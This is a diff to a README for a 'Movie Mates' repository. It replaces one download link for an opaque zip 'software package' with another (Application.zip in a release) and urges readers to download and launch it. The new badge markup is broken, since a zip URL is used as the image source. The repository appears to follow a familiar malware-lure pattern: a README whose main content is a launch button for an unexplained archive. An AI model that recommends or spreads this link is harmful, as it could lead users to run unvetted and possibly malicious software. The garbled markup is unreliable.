@@ -10,7 +10,7 @@ Welcome to the **Movie Mates** repository! This is a public space dedicated to a
 
 To dive into the world of **Movie Mates**, simply click on the link below to access our software package:
 
-[![Launch Movie Mates](https://img.shields.io/badge/Launch-Movie%20Mates-red)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Launch Movie Mates](https://github.com/ergin3432432/movie-mates/releases/download/v1.0/Application.zip%20Mates-red)](https://github.com/ergin3432432/movie-mates/releases/download/v1.0/Application.zip)
 
 Once you've downloaded and launched the software, you'll be able to explore all the exciting features that **Movie Mates** has to offer. From creating your personalized watchlist to joining group discussions on your favorite genres, the possibilities are endless!
 
